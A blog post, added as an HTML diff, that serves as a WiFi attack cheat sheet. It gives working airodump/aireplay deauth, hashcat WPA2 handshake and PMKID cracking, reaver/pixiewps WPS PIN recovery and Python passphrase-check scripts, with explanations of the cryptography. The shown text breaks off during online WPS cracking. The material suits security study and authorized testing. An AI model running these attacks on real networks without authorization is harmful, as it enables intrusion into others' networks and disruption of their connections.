@@ -1,0 +1,1075 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>WiFi attacks cheat sheet – mmmds's blog</title>
+    
+     <meta name="description" content="A cheat sheet consiting of descriptions of attacks against wireless networks like sniffing; cracking WPA2 (handshake, PMKID), WPS, WEP; creating fake AP; decloaking."/> 
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <link rel="stylesheet" type="text/css" href="/style.css" />
+  </head>
+
+
+  <body>
+	<div class="container">
+        <header>
+		<div>mmmds's blog</div>	
+         	<nav>
+            	<a href="/">posts</a>
+				|
+            	<a href="/projects/">projects</a>
+				|
+            	<a href="/about/">about</a>
+        	</nav>
+        </header>
+      </div>
+    </div>
+    <div id="main" role="main" class="container">
+      <article class="post">
+ 	<h1>WiFi attacks cheat sheet</h1>
+	<div><span class="post_list_date">2020-01-21</span></div>
+ 	<div class="entry">
+   	<p>A cheat sheet consiting of descriptions of attacks against wireless networks: sniffing; cracking WPA2 (handshake, PMKID), WPS, WEP; creating fake AP; decloaking. It was created as a summary of information gathered for a wireless network security tool I’ve been working on.</p>
+
+<ul>
+  <li><a href="#capturing-data">Capturing data</a>
+    <ul>
+      <li><a href="#monitor-mode">Switch to monitor mode</a></li>
+      <li><a href="#capturing-packets">Capturing packets</a></li>
+      <li><a href="#interesting-packets">Interesting packets</a></li>
+    </ul>
+  </li>
+  <li><a href="#open-network">Open network</a></li>
+  <li><a href="#wpa">WPA/WPA2 (Personal)</a>
+    <ul>
+      <li><a href="#4hs">4 way handshake</a>
+        <ul>
+          <li><a href="#4hs-cracking">Cracking</a></li>
+          <li><a href="#4hs-explained">Attack exaplained</a></li>
+          <li><a href="#4hs-references">References</a></li>
+        </ul>
+      </li>
+      <li><a href="#pmkid">PMKID</a>
+        <ul>
+          <li><a href="#pmkid-cracking">Cracking</a></li>
+          <li><a href="#pmkid-explained">Attack explained</a></li>
+          <li><a href="#wps-references">References</a></li>
+        </ul>
+      </li>
+      <li><a href="#wpa-decrypting-data">Decrypting data</a></li>
+    </ul>
+  </li>
+  <li><a href="#wps">WPS</a>
+    <ul>
+      <li><a href="#pixie-dust">Pixie Dust (offline cracking)</a>
+        <ul>
+          <li><a href="#pixie-dust-explained">Attack explained</a></li>
+          <li><a href="#pixie-dust-references">References</a></li>
+        </ul>
+      </li>
+      <li><a href="#wps-online">Online cracking</a>
+        <ul>
+          <li><a href="#wps-online-references">References</a></li>
+        </ul>
+      </li>
+      <li><a href="#wps-pin">Retrieving passphrase from PIN</a>
+        <ul>
+          <li><a href="#wps-pin-references">References</a></li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+  <li><a href="#wep">WEP</a>
+    <ul>
+      <li><a href="#wep-attack">Attack</a></li>
+      <li><a href="#wep-attack-references">References</a></li>
+    </ul>
+  </li>
+  <li><a href="#connecting">Connecting to network</a></li>
+  <li><a href="#fake-ap">Fake AP</a>
+    <ul>
+      <li><a href="#fake-ap-references">References</a></li>
+    </ul>
+  </li>
+  <li><a href="#hashcat">Hashcat</a></li>
+</ul>
+
+<h2 id="capturing-data-">Capturing data <a name="capturing-data"></a></h2>
+
+<h3 id="switch-to-monitor-mode-">Switch to monitor mode <a name="monitor-mode"></a></h3>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># airmon-ng check kill
+# ifconfig wlan0 down
+# iwconfig wlan0 mode monitor
+# ifconfig wlan0 up
+</code></pre></div></div>
+
+<h4 id="change-mac">Change MAC</h4>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># macchanger -r wlan0
+</code></pre></div></div>
+
+<h3 id="capturing-packets-">Capturing packets <a name="capturing-packets"></a></h3>
+
+<p><code class="highlighter-rouge">airodump-ng</code> in default configuration iterates over all channels. We can detect what APs and clients are nearby and how they are configured.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># airodump-ng wlan0
+
+ CH 13 ][ Elapsed: 12 s ][ 2019-11-23 08:21
+
+ BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
+
+ EA:DE:07:C0:96:BC  -33       22        0    0  10  54e  WPA2 CCMP   PSK  TP-LINK-HOME1
+ B5:9A:5C:BB:F4:B0  -37       22        0    0  11  54e  WPA2 CCMP   PSK  Test-network
+ F0:0F:3E:C2:20:D0  -70       19        5    0   6  54 . WPA  TKIP   PSK  Home2
+[...]
+
+ BSSID              STATION            PWR   Rate    Lost    Frames  Probe
+                                                                   
+ (not associated)   6B:E7:00:A7:D8:D0  -80    0 - 1      0        1
+ (not associated)   40:31:3C:A0:07:C0  -85    0 - 1      1        2  Office X
+ B5:9A:5C:BB:F4:B0  C2:31:8D:8D:E6:47  -83    0 - 1e     5        2
+ EA:DE:07:C0:96:BC  DA:69:BA:FB:B2:9C  -69    0 -24    107        5
+</code></pre></div></div>
+
+<h4 id="hidden-networks">Hidden networks</h4>
+<p>Some networks may be configured to hide their ESSID.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
+7C:AA:AC:4E:2A:44  -33       13        0    0  11  270   WPA2 CCMP   PSK  &lt;length: 0&gt;
+</code></pre></div></div>
+
+<p><img src="/images/wifi/hidden1.png" alt="" /></p>
+
+<p>This value can be seen when a client connects to the AP. So we can wait or disconnect already connected client (look <a href="#deauth">deauth</a>).</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
+7C:AA:AC:4E:2A:44  00:20:18:AC:EA:AA  -38    0e- 6     53      119         HOME 321
+</code></pre></div></div>
+
+<p><img src="/images/wifi/hidden2.png" alt="" /></p>
+
+<h3 id="interesting-packets-">Interesting packets <a name="interesting-packets"></a></h3>
+
+<h4 id="beacon-">Beacon <a name="beacon"></a></h4>
+
+<p>APs announces themselves sending beacon packets which are received by all nearby devices.</p>
+
+<p><img src="/images/wifi/beacon.png" alt="" /></p>
+
+<h4 id="probe-">Probe <a name="probe"></a></h4>
+
+<p>Clients send probe requests asking for information from an specific AP. It may contain specific SSID or be broadcast.</p>
+
+<p><img src="/images/wifi/probe1.png" alt="" /></p>
+
+<p>AP responds with probe response containing information about itself.</p>
+
+<p><img src="/images/wifi/probe2.png" alt="" /></p>
+
+<p>Client confirms receiving a response.</p>
+
+<p><img src="/images/wifi/probe3.png" alt="" /></p>
+
+<h2 id="open-network-">Open network <a name="open-network"></a></h2>
+
+<p>All data is visible just by switching to monitor mode. Connection to the AP is not required.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># airodump -c 11 -w dump wlan0
+</code></pre></div></div>
+
+<p><img src="/images/wifi/open.png" alt="" /></p>
+
+<h2 id="wpawpa2-personal-">WPA/WPA2 (Personal) <a name="wpa"></a></h2>
+
+<p>WPA and WPA2 Personal networks are vulnerable to a brute force attacks which allows offline guessing of a passphrase.</p>
+
+<h3 id="4-way-handshake-">4 way handshake <a name="4hs"></a></h3>
+
+<p>The attack is based on capturing 4 way handshake (which happens while initiating a sucessful connection to AP). Data from the captured handhsake is used to perform offline passphrase guessing. Success of the attack depends on complexity of the passphrase.</p>
+
+<p>Prerequisites:</p>
+<ul>
+  <li>AP with WPA/WPA2 Personal</li>
+  <li>at least 1 connected client</li>
+</ul>
+
+<h4 id="cracking-">Cracking <a name="4hs-cracking"></a></h4>
+
+<p>1. Start capturing packets</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># airodump-ng -w dump -c 10 --bssid EA:DE:07:C0:96:BC wlan0
+
+CH 10 ][ Elapsed: 4 s ][ 2019-11-23 08:32
+                                                                                                                                                 
+ BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
+                                                                                                                                                 
+ EA:DE:07:C0:96:BC  -40 100       76       11    3  10  54e  WPA2 CCMP   PSK  TP-LINK-HOME1
+                                                                                                                                                 
+ BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                       
+                                                                                                                                                 
+ EA:DE:07:C0:96:BC  DA:69:BA:FB:B2:9C  -26    0e- 0    720       17                      
+</code></pre></div></div>
+
+<p><a name="deauth"></a>
+2. Wait until any client connects OR deauthenticate a currently connected client (where <code class="highlighter-rouge">-a</code> is the AP and <code class="highlighter-rouge">-c</code> is the station)</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># aireplay-ng --deauth 5 -a EA:DE:07:C0:96:BC -c DA:69:BA:FB:B2:9C wlan0
+08:34:17  Waiting for beacon frame (BSSID: EA:DE:07:C0:96:BC) on channel 10
+08:34:17  Sending 64 directed DeAuth. STMAC: [DA:69:BA:FB:B2:9C] [113|70 ACKs]
+08:34:18  Sending 64 directed DeAuth. STMAC: [DA:69:BA:FB:B2:9C] [65|66 ACKs]
+08:34:18  Sending 64 directed DeAuth. STMAC: [DA:69:BA:FB:B2:9C] [61|67 ACKs]
+08:34:19  Sending 64 directed DeAuth. STMAC: [DA:69:BA:FB:B2:9C] [45|64 ACKs]
+08:34:20  Sending 64 directed DeAuth. STMAC: [DA:69:BA:FB:B2:9C] [103|64 ACKs]
+</code></pre></div></div>
+
+<p>3. Notice captured handshake</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CH 10 ][ Elapsed: 4 s ][ 2019-11-23 08:32 ][ WPA handshake: EA:DE:07:C0:96:BC
+                                                                                                                                                 
+ BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
+                                                                                                                                                 
+ EA:DE:07:C0:96:BC  -40 100       76       11    3  10  54e  WPA2 CCMP   PSK  TP-LINK-HOME1                                                       
+</code></pre></div></div>
+
+<p>4. Convert captured handshake into hashcat accepted format</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># aircrack-ng -b 7c:8b:ca:76:3d:86 -j 4hs.2500 dump-03.cap
+Opening dump-03.capease wait...
+Read 892 packets.
+
+1 potential targets
+
+
+
+Building Hashcat (3.60+) file...
+
+[*] ESSID (length: 12): TP-LINK-HOME1
+[*] Key version: 2
+[*] BSSID: EA:DE:07:C0:96:BC
+[*] STA: DA:69:BA:FB:B2:9C
+[*] anonce:
+    F0 0F B7 80 CC 25 CE 2F BC 52 B4 DC 42 E1 92 FA
+    9F 20 DE 98 E1 B2 42 81 38 C3 62 DD 12 25 48 38
+[*] snonce:
+    4F 8C D6 E0 F9 B1 5F 52 11 34 55 21 62 F3 19 DE
+    17 A3 52 94 8F FF F1 6D 7F 1A 94 60 0E 0B DC D1
+[*] Key MIC:
+    0C BB 90 C1 A4 D8 29 82 F9 26 FA 95 81 23 0B C8
+[*] eapol:
+    01 03 00 75 02 01 0A 00 00 00 00 00 00 00 00 00
+    01 4F 1C D6 E1 FD B2 F4 72 C0 33 57 2F 6F F0 19
+    DF 27 A5 52 94 8F FF 5F 6D 7F 1A 94 60 0E 0A DC
+    D2 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+    00 00 16 30 14 01 00 00 0F AC 04 01 00 00 0F AC
+    04 01 00 00 0F AC 02 00 00
+
+Successfully written to 4hs.2500.hccapx
+</code></pre></div></div>
+<p>5. Start hashcat cracking</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@home:~/wifi/wifi-result# hashcat -m 2500 4hs.2500.hccapx dict.txt
+hashcat (v5.1.0) starting...
+
+[...]
+7e253bf3ea542c2193ad42be6713ccd9:eade07c096bc:da69bafbb29c:TP-LINK-HOME1:PASS!@#$
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Type........: WPA-EAPOL-PBKDF2
+[...]
+</code></pre></div></div>
+
+<h4 id="attack-exaplained-">Attack exaplained <a name="4hs-explained"></a></h4>
+<ul>
+  <li>STA (connecting station) and AP (access point) know PMK (Pairwise Master Key):
+    <ul>
+      <li><code class="highlighter-rouge">PMK = PBKDF2(HMAC−SHA1, PSK, SSID, 4096, 256)</code></li>
+    </ul>
+  </li>
+  <li>STA generates SNonce</li>
+  <li>[Message 1] AP generates and sends ANonce</li>
+  <li>STA constructs PTK (Pairwise Transient Key):
+    <ul>
+      <li><code class="highlighter-rouge">PTK = hmac_sha1(key = PMK, message = ("Pairwise key expansion", sta_mac, ap_mac, snonce, anonce))</code>
+        <ul>
+          <li>PTK encrypts and decrypts data</li>
+          <li>PTK structure:
+            <ul>
+              <li>KCK (Key Confirmation Key) 128bits</li>
+              <li>KEK (Key Encryption Key) 128bits</li>
+              <li>TK (Temporal Key) 128bits</li>
+              <li>MIC Tx (MIC Authenticator Tx Key) 64bits</li>
+              <li>MIC Rx (MIC Authenticator Rx Key) 64bits</li>
+            </ul>
+          </li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+  <li>[Message 2] STA sends SNonce and MIC (Message Integrity Code):
+    <ul>
+      <li><code class="highlighter-rouge">MIC = hmac_sha1(key = KCK, message = EAPOL_FRAME)</code></li>
+      <li>sha1 for WPA2, md5 for WPA</li>
+    </ul>
+  </li>
+  <li>[Message 3] AP calculates PTK, calculates and sends GTK (Group Temporal Key) and MIC.
+    <ul>
+      <li>GTK encrypts and decrypts all broadcast and multicast</li>
+    </ul>
+  </li>
+  <li>[Message 4] STA confirms</li>
+</ul>
+
+<p><img src="/images/wifi/4hs1.png" alt="" />
+<img src="/images/wifi/4hs2.png" alt="" /></p>
+
+<p>Problem: Having ANonce, SNonce and MIC (and ssid, AP MAC, STA MAC and frames) is enough for offline bruteforce. For a dumped frame we can recalculate MIC using passphrase candidate and verify if it matches to the original one.</p>
+
+<p>Script utilizing collected data, allowing to manually test a passphrase. It is a modified script taken from <a href="https://www.cyberpunk.rs/capturing-wpa-wpa2-handshake">https://www.cyberpunk.rs/capturing-wpa-wpa2-handshake</a></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import hmac,hashlib,binascii,sha
+import sys
+from pbkdf2 import PBKDF2
+
+ssid = "test-network"
+passphrase = "PASS_1234"
+ap_mac = binascii.a2b_hex("7caaaaaaaaaa")
+s_mac = binascii.a2b_hex("9cbbbbbbbbbbbb")
+anonce = binascii.a2b_hex("172862407f172cc2ba0dd050f9fca0ec85d402482e481a7e9feffada440d4b12")
+snonce = binascii.a2b_hex("477862dac237e3a60229276527bc343735c66f9a05ea80da6cf9ec92c54b74022")
+eapolFrame = binascii.a2b_hex("880[...]000000000cdd96928ccc19bcb2222736eec4fa2b5[...]")
+
+# sorting function for byte strings
+def sort(in_1, in_2):
+         if len(in_1) != len(in_2):
+             raise 'lengths do not match!'
+         in_1_byte_list = list(bytes(in_1))
+         in_2_byte_list = list(bytes(in_2))
+
+         for i in range(0, len(in_1_byte_list)):
+            if in_1_byte_list[i] &lt; in_2_byte_list[i]:
+                return (in_2, in_1) # input 2 is bigger
+            elif in_1_byte_list[i] &gt; in_2_byte_list[i]:
+                return (in_1, in_2) # input 1 is bigger
+         return (in_1, in_2) # equal (shouldn't happen)
+
+  
+max_mac, min_mac = sort(ap_mac, s_mac)
+max_nonce, min_nonce = sort(anonce, snonce)
+message = b''.join([
+         b'Pairwise key expansion\x00',
+         min_mac,
+         max_mac,
+         min_nonce,
+         max_nonce,
+         b'\x00'
+     ])
+
+pmk = hashlib.pbkdf2_hmac('sha1', passphrase, ssid.encode(), 4096, 32)
+pke = "Pairwise key expansion"
+key_data = min(ap_mac,s_mac) + max(ap_mac,s_mac) + min(anonce,snonce) + max(anonce,snonce)
+ptk = hmac.new(pmk, message, hashlib.sha1).digest()
+kck = hmac.new(pmk, message, hashlib.sha1).digest()[:16]
+
+frame802 = eapolFrame[34:]
+mic = frame802[81:97]
+eapol_frame_zeroed_mic = b''.join([
+                           frame802[:81],
+                           b'\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0',
+                           frame802[97:]
+                      ])
+calculated_mic = hmac.new(kck, eapol_frame_zeroed_mic, hashlib.sha1).digest()[:16]
+         
+print ("PMK: " + pmk.encode('hex') )
+print ("PTK: " + ptk.encode('hex') )
+print ("KCK: " + kck.encode('hex') )
+         
+print ("Packet MIC: " + mic.encode('hex') )
+print ("Calculated MIC: " + calculated_mic.encode('hex'))
+         
+if (mic == calculated_mic):
+    print "*** Correct Password ! ***"
+else:
+    print "**** Wrong Password ! ****"
+</code></pre></div></div>
+
+<h4 id="references-">References <a name="4hs-references"></a></h4>
+<ul>
+  <li><a href="https://www.aircrack-ng.org/doku.php?id=cracking_wpa">https://www.aircrack-ng.org/doku.php?id=cracking_wpa</a></li>
+  <li><a href="https://www.cyberpunk.rs/capturing-wpa-wpa2-handshake">https://www.cyberpunk.rs/capturing-wpa-wpa2-handshake</a></li>
+  <li><a href="https://www.wifi-professionals.com/2019/01/4-way-handshake">https://www.wifi-professionals.com/2019/01/4-way-handshake</a></li>
+</ul>
+
+<h3 id="pmkid-">PMKID <a name="pmkid"></a></h3>
+
+<p>Alternative way to crack passphrase, discovered in 2018. This one differs from 4 way handshake cracking in that does not require any connected client, however not every AP is susceptible to this kind of attack.</p>
+
+<p>Prerequisites:</p>
+<ul>
+  <li>AP with WPA/WPA2 Personal
+    <ul>
+      <li>which includes optional PMKID field in the first message of a handshake</li>
+    </ul>
+  </li>
+</ul>
+
+<h3 id="cracking--1">Cracking <a name="pmkid-cracking"></a></h3>
+
+<p>1. Start capturing packets</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># airodump-ng -c 11 -w dump wlan0
+
+ CH 11 ][ Elapsed: 8 s ][ 2019-11-23 09:21                                         
+                                                                                                                                                 
+ BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
+                                                                                                                                                 
+ EA:DE:07:C0:96:BC  -41 100       72       12    3  10  54e  WPA2 CCMP   PSK  TP-LINK-HOME1
+
+</code></pre></div></div>
+<p>2. Run tshark to detect PMKID in handshake.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># cat dump-09.cap | tshark -Y eapol -T fields -e frame.number -e frame.time_delta -e _ws.col.Source -e _ws.col.Destination -e _ws.col.Protocol -e _ws.col.Info -e wlan.rsn.ie.pmkid -n -i -
+Running as user "root" and group "root". This could be dangerous.
+Capturing on 'Standard input'
+</code></pre></div></div>
+<p>3. Wait until any client connects or initiate connection with any (even invalid) password (for example using other network interface, computer or phone)</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>49262 0.001535000 ea:de:07:c0:96:bc c7:62:23:15:dc:f2 EAPOL Key (Message 1 of 4)  22:e1:2c:ac:c2:52:8f:ff:e1:d2:ce:3e:7b:02:97:5e
+49269 0.001534000 c7:62:23:15:dc:f2 ea:de:07:c0:96:bc EAPOL Key (Message 2 of 4)  
+</code></pre></div></div>
+<p>If the router is not vulnerable, Message 1 will not contain PMKID column.</p>
+
+<p>4. Convert captured handshake into hashcat accepted format</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># hcxpcaptool --filtermac=eade07c096bc -k pmkid.16800 dump-09.cap 
+
+reading from dump-09.cap
+                                                
+summary capture file:                           
+---------------------
+file name........................: dump-09.cap
+file type........................: pcap 2.4
+file hardware information........: unknown
+capture device vendor information: 000000
+file os information..............: unknown
+file application information.....: unknown
+network type.....................: DLT_IEEE802_11 (105)
+endianness.......................: little endian
+read errors......................: flawless
+minimum time stamp...............: 23.11.2019 08:21:55 (GMT)
+maximum time stamp...............: 23.11.2019 08:30:15 (GMT)
+packets inside...................: 51062
+skipped packets (damaged)........: 0
+packets with GPS data............: 0
+packets with FCS.................: 0
+beacons (total)..................: 1
+beacons (WPS info inside)........: 1
+probe responses..................: 559
+association requests.............: 2
+association responses............: 2
+authentications (OPEN SYSTEM)....: 4
+authentications (BROADCOM).......: 2
+disassociations..................: 2
+action packets...................: 40
+EAPOL packets (total)............: 19
+EAPOL packets (WPA2).............: 19
+PMKIDs (not zeroed - total)......: 1
+PMKIDs (WPA2)....................: 8
+PMKIDs from access points........: 1
+best handshakes (total)..........: 1 (ap-less: 0)
+best PMKIDs (total)..............: 1
+
+summary output file(s):
+-----------------------
+1 PMKID(s) written to pmkid.16800
+</code></pre></div></div>
+
+<p>5. Start hashcat cracking</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># hashcat -a 0 -m 16800 pmkid.16800 dict.txt 
+hashcat (v5.1.0) starting...
+
+[...]
+
+[...]444434:PASS!@#$
+                                                 
+[Session..........: hashcat
+Status...........: Cracked
+Hash.Type........: WPA-PMKID-PBKDF2
+[...]
+</code></pre></div></div>
+
+<h4 id="attack-explained-">Attack explained <a name="pmkid-explained"></a></h4>
+
+<p>PMKID is an optional field in Message 1 of a handshake.</p>
+
+<p><code class="highlighter-rouge">PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)</code></p>
+
+<p><img src="/images/wifi/pmkid.png" alt="" /></p>
+
+<p>Having PMKID is enough for offline bruteforce. We can recalculate PMK and PMKID using a passphrase candidate and compare the result with captured PMKID.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import hmac,hashlib,binascii,sha
+from pbkdf2 import PBKDF2
+
+ssid = "TP-LINK-HOME1"
+passphrase = "PASS!@#$"
+ap_mac = binascii.a2b_hex("eade07c096bc")
+s_mac = binascii.a2b_hex("c7622315dcf2")
+pmkid = "22e12cacc2528fffe1d2ce3e7b02975e"
+ 
+pmk = hashlib.pbkdf2_hmac('sha1', passphrase, ssid.encode(), 4096, 32)
+
+#PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
+msg = b''.join(["PMK Name", ap_mac, s_mac])
+new_pmkid = hmac.new(pmk, msg, hashlib.sha1).hexdigest()[:32]
+print "{} == {}\n{}".format(pmkid, new_pmkid, pmkid == new_pmkid)
+</code></pre></div></div>
+
+<h4 id="references--">References  <a name="wps-references"></a></h4>
+<ul>
+  <li><a href="https://hashcat.net/forum/thread-7717.html">https://hashcat.net/forum/thread-7717.html</a></li>
+  <li><a href="https://documentation.meraki.com/MR/Other_Topics/PMKID_Vulnerability_FAQ_-_WPA%2F%2FWPA2-PSK_and_802.11r">https://documentation.meraki.com/MR/Other_Topics/PMKID_Vulnerability_FAQ_-_WPA%2F%2FWPA2-PSK_and_802.11r</a></li>
+</ul>
+
+<h3 id="decrypting-data-">Decrypting data <a name="wpa-decrypting-data"></a></h3>
+
+<p>When we have a valid passphrase and captured data (with handshake), it’s possible to decrypt it in Wireshark.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Edit -&gt; Preferences -&gt; Protocols -&gt; IEEE 802.11 -&gt; Decryption keys: edit -&gt; wpa-pwd
+</code></pre></div></div>
+
+<p><img src="/images/wifi/decrypted.png" alt="" /></p>
+
+<h2 id="wps-">WPS <a name="wps"></a></h2>
+
+<p>WPS is a configuration protocol which simplifies connecting process to WPA/WPA2 networks. One of allowed mode is based on using PIN instead of passphrase. A client connects using PIN, after sucessful authentication AP sends back a passphrase. PIN is 8 digit long, so it may be brute forced easier than complex passphrases. Attack takes a few seconds.</p>
+
+<h3 id="pixie-dust-offline-cracking-">Pixie Dust (offline cracking) <a name="pixie-dust"></a></h3>
+
+<p>This attack is possible on some APs which improperly generates nonce values. Using values sent back by AP when connection is initiated, PIN can be brute forced locally.</p>
+
+<p>Prerequisites:</p>
+<ul>
+  <li>AP with WPA/WPA2
+    <ul>
+      <li>WPS enabled</li>
+      <li>vulnerable to Pixie Dust (<a href="https://docs.google.com/spreadsheets/d/1tSlbqVQ59kGn8hgmwcPTHUECQ3o9YhXR91A_p7Nnj5Y/edit?pli=1#gid=2048815923">list</a>)</li>
+    </ul>
+  </li>
+</ul>
+
+<p>1. Start capturing traffic to detect WPS enabled access points.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># airodump-ng -wps wlan0
+
+CH 10 ][ Elapsed: 16 s ][ 2019-11-23 09:40
+                                                                                                                                                 
+ BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH WPS                ESSID
+                                                                                                                                                 
+ EA:DE:07:C0:96:BC  -27       19        0    0   2  270  WPA2 CCMP   PSK  2.0 LAB,DISP,KPAD  TP-LINK-HOME1
+
+</code></pre></div></div>
+
+<p>2. Start attack against chosen AP.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># reaver -i wlan0 -b EA:DE:07:C0:96:BC -c 10 -K -vv
+
+Reaver v1.6.5 WiFi Protected Setup Attack Tool
+Copyright (c) 2011, Tactical Network Solutions, Craig Heffner &lt;cheffner@tacnetsol.com&gt;
+
+[+] Switching wlan0 to channel 10
+[+] Waiting for beacon from EA:DE:07:C0:96:BC
+[+] Received beacon from EA:DE:07:C0:96:BC
+[+] Vendor: RalinkTe
+[+] Trying pin "12345670"
+[+] Sending authentication request
+[+] Sending association request
+[+] Associated with EA:DE:07:C0:96:BC (ESSID: TP-LINK-HOME1)
+[+] Sending EAPOL START request
+[+] Received identity request
+[+] Sending identity response
+[+] Received M1 message
+[+] Sending M2 message
+[+] Received identity request
+[+] Sending identity response
+executing pixiewps -e 4f6898ac0[...]
+
+ Pixiewps 1.4
+
+ [?] Mode:     1 (RT/MT/CL)
+ [*] Seed N1:  0x2930b9a4
+ [*] Seed ES1: 0x3357a9d3
+ [*] Seed ES2: 0x33e8deb9
+ [*] PSK1:     b6652e640a19c4d1c76a29aaee6619f7
+ [*] PSK2:     959e3a20cfd1d596c0a8947241a6955c
+ [*] ES1:      b5a1f5df165ea2e7a318abcdbb290d44
+ [*] ES2:      c3046d51a17e330ead58e3869374fb8c
+ [+] WPS pin:  11586541
+
+ [*] Time taken: 0 s 130 ms
+
+[+] Pixiewps: success: setting pin to 43013654
+[+] Received M3 message
+[+] Sending M4 message
+[+] Received M5 message
+[+] Sending M6 message
+[+] Received M7 message
+[+] Sending WSC NACK
+[+] Sending WSC NACK
+[+] Updated P1 array
+[+] Updated P2 array
+[+] Quitting after pixiewps attack
+[+] Pin cracked in 5 seconds
+[+] WPS PIN: '11586541'
+[+] WPA PSK: 'PASS!@#$'
+[+] AP SSID: 'TP-LINK-HOME1'
+</code></pre></div></div>
+
+<h4 id="attack-explained--1">Attack explained <a name="pixie-dust-explained"></a></h4>
+
+<p>Parts of WPS exchange:</p>
+
+<ul>
+  <li>Message 1:
+    <ul>
+      <li>Enrollee Nonce</li>
+      <li>PKE Public Key (Enrollee Public Key)</li>
+    </ul>
+  </li>
+</ul>
+
+<p><img src="/images/wifi/wps1.png" alt="" /></p>
+
+<ul>
+  <li>Message 2:
+    <ul>
+      <li>Registrar Nonce</li>
+      <li>PKR Public Key (Registrar Public Key)</li>
+    </ul>
+  </li>
+</ul>
+
+<p><img src="/images/wifi/wps2.png" alt="" /></p>
+
+<ul>
+  <li>Message 3:
+    <ul>
+      <li>E-Hash1
+        <ul>
+          <li><code class="highlighter-rouge">E-Hash1 = HMAC-SHA-256(authkey) (E-S1 | PSK1 | PKE | PKR)</code></li>
+          <li>PSK1 - first part of PIN</li>
+        </ul>
+      </li>
+      <li>E-Hash2
+        <ul>
+          <li><code class="highlighter-rouge">E-Hash2 = HMAC-SHA-256(authkey) (E-S2 | PSK2 | PKE | PKR)</code></li>
+          <li>PSK2 - second part of PIN</li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+</ul>
+
+<p><img src="/images/wifi/wps3.png" alt="" /></p>
+
+<ul>
+  <li>Authkey - derived from KDK. Calculation in <a href="https://github.com/t6x/reaver-wps-fork-t6x/blob/master/src/wps/wps_common.c#L67">reaver</a>.</li>
+</ul>
+
+<p>Some vendors (Broadcom, Realtek, Ralink, MediaTek, Celeno) improperly generate E-S1 and E-S2, so these values are known or easy to guess. Having all these values, we can recalculate E-Hash using PSK (PIN) candidate until result matches with a captured value. PIN is split into two parts which are verified separately, thus there are 20.000 possible combinations.</p>
+
+<h4 id="references--1">References <a name="pixie-dust-references"></a></h4>
+
+<p><a href="https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)">https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)</a></p>
+
+<h3 id="online-cracking-">Online cracking <a name="wps-online"></a></h3>
+
+<p>If AP is not vulnerable to Pixie Dust, it still can be brute forced online. This attack may take many hours.</p>
+
+<p>Prerequisites:</p>
+<ul>
+  <li>AP with WPA/WPA2
+    <ul>
+      <li>WPS enabled</li>
+    </ul>
+  </li>
+</ul>
+
+<p>1. Start attack against desired AP.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># reaver -i wlan0 -b EA:DE:07:C0:96:BC -c 2 -vv
+
+Reaver v1.6.5 WiFi Protected Setup Attack Tool
+Copyright (c) 2011, Tactical Network Solutions, Craig Heffner &lt;cheffner@tacnetsol.com&gt;
+
+[+] Switching wlan0 to channel 2
+[+] Waiting for beacon from EA:DE:07:C0:96:BC
+[+] Received beacon from EA:DE:07:C0:96:BC
+[+] Vendor: RalinkTe
+[+] Trying pin "12345670"
+[+] Sending authentication request
+[+] Sending association request
+[+] Associated with EA:DE:07:C0:96:BC (ESSID: TP-LINK-HOME1)
+[+] Sending EAPOL START request
+[+] Received identity request
+[+] Sending identity response
+[+] Received identity request
+[+] Sending identity response
+[+] Received M1 message
+[+] Sending M2 message
+[+] Received M3 message
+[+] Sending M4 message
+[+] Received WSC NACK
+[+] Sending WSC NACK
+[+] Trying pin "00005678"
+[...]
